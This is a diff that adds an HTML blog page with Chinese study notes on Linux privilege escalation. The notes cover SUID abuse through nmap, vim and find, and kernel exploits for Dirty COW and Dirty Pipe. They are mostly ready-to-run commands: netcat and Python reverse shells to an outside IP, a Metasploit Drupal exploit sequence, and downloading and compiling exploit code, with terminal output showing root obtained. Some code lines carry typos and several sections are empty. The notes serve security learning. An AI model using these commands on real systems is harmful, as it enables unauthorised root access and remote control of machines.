@@ -1,0 +1,753 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="JUNYI">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="linux提权12345678910111213141516先信息收集，收集系统信息，EXP信息，IP,端口。信息收集系统自带规则--SUID漏洞提权一一通过第一步的信息收集其他的不安全配置环境变量配合SUID定时任务提权---tar 压缩配置不安全1.怎么出现的&#x2F;出现的场景 --- 定时任务，定时运行的脚本中。存在tar压缩配置不安全。这种脚本常见于运维定时备份2.原理&#x2F;(根据原理)怎么利用的-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升linux">
+<meta property="og:url" content="http://example.com/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83linux/index.html">
+<meta property="og:site_name" content="俊毅网络安全">
+<meta property="og:description" content="linux提权12345678910111213141516先信息收集，收集系统信息，EXP信息，IP,端口。信息收集系统自带规则--SUID漏洞提权一一通过第一步的信息收集其他的不安全配置环境变量配合SUID定时任务提权---tar 压缩配置不安全1.怎么出现的&#x2F;出现的场景 --- 定时任务，定时运行的脚本中。存在tar压缩配置不安全。这种脚本常见于运维定时备份2.原理&#x2F;(根据原理)怎么利用的-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514232723.png">
+<meta property="og:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514231952.png">
+<meta property="og:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514235112.png">
+<meta property="og:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230515141911.png">
+<meta property="og:image" content="http://example.com/image/1-16841344324143.png">
+<meta property="og:image" content="http://example.com/image/2-16841344324144.png">
+<meta property="og:image" content="http://example.com/image/3.png">
+<meta property="og:image" content="http://example.com/image/4-16841344324122.png">
+<meta property="og:image" content="http://example.com/image/image-20230505170751181.png">
+<meta property="og:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516102123.png">
+<meta property="og:image" content="http://example.com/image/QQ%E6%88%AA%E5%9B%BE20230516115704.jpg">
+<meta property="article:published_time" content="2023-06-14T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-14T04:47:02.291Z">
+<meta property="article:author" content="JUNYI">
+<meta property="article:tag" content="安全技术">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514232723.png">
+  
+  
+  
+  <title>权限提升linux - 俊毅网络安全</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>JunYi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="权限提升linux"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-14 12:00" pubdate>
+          2023年6月14日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">权限提升linux</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">先信息收集，收集系统信息，EXP信息，IP</span><span class="hljs-string">,</span><span class="hljs-comment">端口。</span><br><span class="hljs-comment">信息收集</span><br><span class="hljs-comment">系统自带规则</span><span class="hljs-literal">--</span><span class="hljs-comment">SUID</span><br><span class="hljs-comment">漏洞提权一一通过第一步的信息收集</span><br><span class="hljs-comment">其他的不安全配置</span><br><span class="hljs-comment">环境变量配合SUID</span><br><span class="hljs-comment">定时任务提权</span><br><span class="hljs-literal">---</span><span class="hljs-comment">tar 压缩配置不安全</span><br><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">怎么出现的/出现的场景</span> <span class="hljs-literal">---</span> <span class="hljs-comment">定时任务，定时运行的脚本中。存在tar压缩配置不安全。这种脚本常见于运维定时备份2</span><span class="hljs-string">.</span><span class="hljs-comment">原理/(根据原理)怎么利用的</span><br><span class="hljs-literal">---</span> <span class="hljs-comment">利用的tar中需要压缩所有文件 在压缩命令末尾处存在* 号通配符匹配所有文件</span><br><span class="hljs-literal">--</span> <span class="hljs-comment">创建tar相应的以命令参数命名的文件，以及利用(命令参数执行利用) A脚本(我们自己写的</span><br><span class="hljs-comment">3</span><span class="hljs-string">.</span> <span class="hljs-comment">cp /bin/bash /tmp/aaa/bash; chmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">s /tmp/bash</span><br><span class="hljs-comment">SUID</span><br><span class="hljs-comment">4</span><span class="hljs-string">.</span><span class="hljs-comment">dhmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">s /user/bin/find</span><br><span class="hljs-comment">5</span><span class="hljs-string">.</span><span class="hljs-comment">反弹shell</span><span class="hljs-literal">--</span><span class="hljs-comment">nc下载木马 wget:</span> <span class="hljs-literal">----</span> <span class="hljs-comment">执行</span><br><span class="hljs-literal">-</span><span class="hljs-comment">文件权限配置不安全</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="往上滑"><a href="#往上滑" class="headerlink" title="往上滑"></a>往上滑</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// Shift+PgUppause</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">curl ifconfig.me 可见自己IP<br><br>*一个综合类探针: https:<span class="hljs-comment">//github.com/liamg/traitor (上传后直接运行即可)</span><br>个自动化提权: https:<span class="hljs-comment">//github.com/Alessandroz/BeRoot(需要py环境)</span><br>*信息收集: https:<span class="hljs-comment">//github.com/rebootuser/LinEnum(出系统信息)</span><br>*信息收集: https:<span class="hljs-comment">//github.com/mzdt-/linux-exploit-suggester (出EXP信息)</span><br>漏洞探针: https:<span class="hljs-comment">//github.com/sleventyeleven/inuxprivchecker(需要py环境)</span><br>*漏洞探针: https:<span class="hljs-comment">//github,com/jondonas/1inux-exploit-suggester-2</span><br>进制文件提权查询:<br>Linux: https:<span class="hljs-comment">//gtfobins.github.io/</span><br>windows:https:<span class="hljs-comment">//1o1bas-project.github.io/</span><br>set payload php/meter--/reverse--<br></code></pre></td></tr></table></figure>
+
+<h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 原理是什么?</span><br><span class="hljs-title function_ invoke__">SUID</span> (set User ID) 是一种特殊的权限设置，<br>用于在执行程序时将有效用户<span class="hljs-title function_ invoke__">ID</span> (UID) 临时更改为程序文件所有者的UID<br><br>root suid-&gt;find<br><br><span class="hljs-title function_ invoke__">boy</span> (运维人员) <span class="hljs-title function_ invoke__">find</span> (root)<br><br><span class="hljs-comment">// 漏洞成因: chmod u+s给予了suid u-s删除了suid</span><br>如: chmod u+s find<br>使程序在运行中受到了suid root权限的执行过程导致<br><br><span class="hljs-comment">// 提权过程: 探针是否有SUID(手工或脚本)-特定SUID利用-</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h4><h6 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 手工命令探针安全:</span><br>find / -user root -perm -<span class="hljs-number">4000</span> -<span class="hljs-keyword">print</span> <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br>find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br>find / -user root -perm -<span class="hljs-number">4000</span> -exec <span class="hljs-number">1</span>s -<span class="hljs-number">1</span>db &#123;&#125; \;<br></code></pre></td></tr></table></figure>
+
+<h6 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 脚本项目探针安全:</span><br>LinEnum.sh traitor Tinuxprivchecker<br></code></pre></td></tr></table></figure>
+
+<h4 id="suid利用"><a href="#suid利用" class="headerlink" title="suid利用"></a>suid利用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 参考利用：</span><br>https:<span class="hljs-comment">//gtfobins.github.io/</span><br>https:<span class="hljs-comment">//pentestlab.blog/2017/09/25/suid-executables/</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">nmap -V<br>nmap --interactive<br>nmap&gt; !sh<br>sh-<span class="hljs-number">3.2</span><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514232723.png" srcset="/img/loading.gif" lazyload alt="微信截图_20230514232723"></p>
+<h6 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">vim.tiny /etc shadow<br>vim.tiny<br><span class="hljs-comment"># Press ESC key</span><br>:set she11=/bin/sh<br>:she11<br></code></pre></td></tr></table></figure>
+
+<h6 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">chmod u+x /usr/bin/find  <span class="hljs-comment">//赋予find的root权限</span><br><br>touch pentestTab<br>find pentestlab -exec whoami \; <span class="hljs-comment">//可以看见为root权限</span><br>----<br>find pentestlab -exec netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<span class="hljs-comment">//执行反弹命令</span><br>----<br>netcat <span class="hljs-number">192.1681</span>.<span class="hljs-number">189</span> <span class="hljs-number">5555</span><br>id<br>cat /etc/shadow<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514231952.png" srcset="/img/loading.gif" lazyload alt="微信截图_20230514231952"></p>
+<h6 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<h6 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<h6 id="More"><a href="#More" class="headerlink" title="More"></a>More</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<h6 id="Nano"><a href="#Nano" class="headerlink" title="Nano"></a>Nano</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<h6 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">touch yeye<br>find yeye -exec whoami \;<br>shell 生成网址: https:<span class="hljs-comment">//forum.ywhack.com/shell.php</span><br><br>利用NC反弹:<br>find yeye -exec netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<br>netcat xx.xx.xx.xx <span class="hljs-number">5555</span><br>  <br>利用Python反弹:<br>find yeye -exec python -c <span class="hljs-string">&#x27;import</span><br><span class="hljs-string">socket ,subprocess ,os :s=socket ,socket(socket,AF_INET,socket ,SOCK STREAM) :s , connect((&quot;47 .94.236.117&quot; 7777));os ,dup2(s ,fieno() , 0) ;os ,dup2(s ,fileno() ,1);os ,dup2(s ,fileno() ,2);p=slbprocess .ca11([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;<br><br>nc -lvp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><h4 id="普通EXP"><a href="#普通EXP" class="headerlink" title="普通EXP"></a>普通EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 提权过程: 连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG</span><br>探针项目: BeRoot linux-exploit-suggester linux-exploit-suggester2<br>  <br>zip xxx make<br>.c gcc <span class="hljs-number">45010</span>.c -o exp<br>chmod +x exp<br>./exp<br>id<br><span class="hljs-comment">// 通过探针结果---&gt;下载对应exp脚本---》编译 (.c/makefile) /运行</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514235112.png" srcset="/img/loading.gif" lazyload alt="微信截图_20230514235112"></p>
+<h4 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权(CVE-2016-5195)"></a>脏牛提权(CVE-2016-5195)</h4><h6 id="lampiao靶场复现"><a href="#lampiao靶场复现" class="headerlink" title="lampiao靶场复现"></a>lampiao靶场复现</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 脏牛提权(CVE-2016-5195)</span><br>内核提权整个过程: (linux-exploit-suggester获取信息哦)<br>内核漏洞提权过程: 寻可用-下exp-上/tmp-编译exp-执行(无权限用chmod)<br>nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">46.0</span>/<span class="hljs-number">24</span><br>nmap -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">46.144</span><br>search drupal<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">unix</span>/<span class="hljs-title">webapp</span>/<span class="hljs-title">drupal_drupalgeddon2</span><br><span class="hljs-title">set</span> <span class="hljs-title">rhost</span> 192.168,46.144<br><span class="hljs-title">set</span> <span class="hljs-title">rport</span> 1898<br><span class="hljs-title">run</span><br>===脏牛提权===<br><span class="hljs-title">upload</span> /<span class="hljs-title">root</span>/<span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span> /<span class="hljs-title">tmp</span>/<span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span><br><span class="hljs-title">g</span>++ -<span class="hljs-title">Wall</span> -<span class="hljs-title">pedantic</span> -<span class="hljs-title">O2</span> -<span class="hljs-title">std</span>=<span class="hljs-title">c</span>++11 -<span class="hljs-title">pthread</span> -<span class="hljs-title">o</span> <span class="hljs-title">dcow</span> <span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span> -<span class="hljs-title">lutil</span><br><span class="hljs-title">python</span> -<span class="hljs-title">c</span> &#x27;<span class="hljs-title">import</span> <span class="hljs-title">pty</span>; pty.<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">./dcow</span><br><span class="hljs-string">su root</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="脏管提权-CVE-2022-0847"><a href="#脏管提权-CVE-2022-0847" class="headerlink" title="脏管提权(CVE-2022-0847)"></a>脏管提权(CVE-2022-0847)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">方法 劫持[SUID](https:<span class="hljs-comment">//so.csdn.net/so/search?q=SUID&amp;spm=1001.2101.3001.7020)文件/root</span><br></code></pre></td></tr></table></figure>
+
+<p>方法一：劫持<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dirty Pipe(CVE-2022-0847)<br>5.8&lt;=Linux kernel&lt;5.16.11/5.15.25/5.10.102<br>查看内核版本 <span class="hljs-built_in">uname</span> -srm<br><br>wget https://haxx.in/files/dirtypipez.c<br>gcc -std=c99 dirtypipez.c -o dirtypipez<br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><br>./dirtypipez /usr/bin/su  <span class="hljs-comment">#任何具体suid权限的文件均可</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+
+<p>方法二：复写&#x2F;etc&#x2F;passwd</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-string">./compile.sh</span>               <br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-keyword">ls</span><br>compile.sh  exploit  exploit.c  LICENSE.txt  README.md<br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-string">./exploit</span>   <br>Backing up <span class="hljs-string">/etc/passwd</span> to <span class="hljs-string">/tmp/passwd.bak</span> <span class="hljs-string">...</span><br>Setting root password to <span class="hljs-string">&quot;aaron&quot;</span><span class="hljs-string">...</span><br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ su<br>Password: <br><span class="hljs-comment"># id</span><br>uid=0<span class="hljs-params">(root)</span> gid=0<span class="hljs-params">(root)</span> groups=0<span class="hljs-params">(root)</span>,4<span class="hljs-params">(adm)</span>,20<span class="hljs-params">(dialout)</span>,119<span class="hljs-params">(wireshark)</span>,142<span class="hljs-params">(kaboxer)</span><br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>方法三</p>
+<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia">脚本运行  bash Dirty-<span class="hljs-built_in">Pipe</span>.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230515141911.png" srcset="/img/loading.gif" lazyload alt="微信截图_20230515141911"></p>
